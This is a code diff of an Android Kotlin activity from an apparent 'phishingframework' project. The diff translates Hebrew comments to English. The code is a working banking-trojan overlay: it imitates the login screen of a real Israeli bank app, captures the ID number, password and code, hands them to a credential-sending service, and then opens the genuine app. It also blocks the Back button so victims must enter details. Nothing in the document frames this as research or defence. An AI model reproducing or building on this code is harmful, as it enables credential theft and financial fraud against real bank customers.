@@ -22,9 +22,9 @@ import com.example.phishingframework.utils.Constants
 import com.example.phishingframework.utils.ValidationUtils
 import java.util.*
 
-//חיקוי מסך התחברות - מציגה ממשק זהה לאפליקציית הבנק האמיתית
-//גניבת קרדנציאלס - אוספת תעודת זהות, סיסמה וקוד מזהה
-//העברה לאפליקציה האמיתית - לאחר גניבת הנתונים, פותחת את האפליקציה האמיתית
+//Login screen imitation - displays an interface identical to the real bank application
+//Credential theft - collects ID number, password and identification code
+//Transfer to real application - after stealing the data, opens the real application
 class PhishingOverlayActivity : Activity() {
 
     // Regex patterns
@@ -35,31 +35,25 @@ class PhishingOverlayActivity : Activity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
-        // רקע שקוף
         window.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
 
-        // טוענים את הממשק
         setContentView(R.layout.phishing_login_overlay)
 
-        // קביעת ברכה לפי השעה
+        // Set greeting according to time
         setDynamicGreeting()
 
-        // מוצאים את הרכיבים
         val idField = findViewById<EditText>(R.id.id_field)
         val passwordField = findViewById<EditText>(R.id.password_field)
         val codeField = findViewById<EditText>(R.id.code_field)
         val loginButton = findViewById<Button>(R.id.login_button)
 
-        // בודקים אם יש הודעת שגיאה מהניסיון הקודם
+        // Check if there's an error message from the previous attempt
         val errorMessage = intent.getStringExtra("error_message")
         if (errorMessage != null) {
             passwordField.error = errorMessage
-            // מוחקים את הסיסמה הקודמת
             passwordField.setText("")
         }
 
-        // TextWatcher לניקוי שגיאות
         val watcher = object : TextWatcher {
             override fun afterTextChanged(s: Editable?) {
                 if (idField.error != null && ID_REGEX.matches(idField.text))
@@ -77,25 +71,20 @@ class PhishingOverlayActivity : Activity() {
         passwordField.addTextChangedListener(watcher)
         codeField.addTextChangedListener(watcher)
 
-        // רישום receiver לתוצאות
+        // Register receiver for results
         resultReceiver = object : BroadcastReceiver() {
             override fun onReceive(context: Context, intent: Intent) {
                 when (intent.action) {
                     Constants.ACTION_CREDENTIALS_OK -> {
                         Log.i("PhishingOverlay", "Credentials sent successfully")
-
-                        // פותחים את האפליקציה האמיתית
                         val launchIntent = packageManager.getLaunchIntentForPackage("com.ideomobile.mercantile")
                         if (launchIntent != null) {
                             launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                             launchIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                             startActivity(launchIntent)
                         }
-
-                        // סוגרים את ה-overlay
                         finish()
                     }
-
                     Constants.ACTION_CREDENTIALS_FAILED -> {
                         Toast.makeText(
                             this@PhishingOverlayActivity,
@@ -106,45 +95,34 @@ class PhishingOverlayActivity : Activity() {
                 }
             }
         }
-
         val filter = IntentFilter().apply {
             addAction(Constants.ACTION_CREDENTIALS_OK)
             addAction(Constants.ACTION_CREDENTIALS_FAILED)
         }
-
         ContextCompat.registerReceiver(
             this,
             resultReceiver,
             filter,
             ContextCompat.RECEIVER_NOT_EXPORTED
         )
-
-        // לחיצה על כפתור הכניסה
         loginButton.setOnClickListener {
-            // ולידציה
             if (!ValidationUtils.validateAndMarkErrors(idField, passwordField, codeField)) {
                 return@setOnClickListener
             }
-
             val idNumber = idField.text.toString()
             val password = passwordField.text.toString()
             val code = codeField.text.toString()
 
             Log.d("PhishingOverlay", "Sending credentials: id=$idNumber")
 
-            // שליחת הנתונים לשירות
+            // Send data to service
             val intent = Intent(this, CredentialSendService::class.java).apply {
                 putExtra("id", idNumber)
                 putExtra("password", password)
                 putExtra("code", code)
             }
             startService(intent)
-
-            // לא סוגרים את ה-Activity כאן!
-            // נחכה לתשובה מה-BroadcastReceiver
         }
-
-        // פוקוס על שדה ת"ז
         idField.requestFocus()
     }
 
@@ -164,8 +142,8 @@ class PhishingOverlayActivity : Activity() {
     }
 
     override fun onBackPressed() {
-        // מונעים סגירה בלחיצה על Back
-        // המשתמש חייב להזין פרטים
+        // Prevent closing with Back button press
+        // User must enter details
     }
 
     override fun onDestroy() {
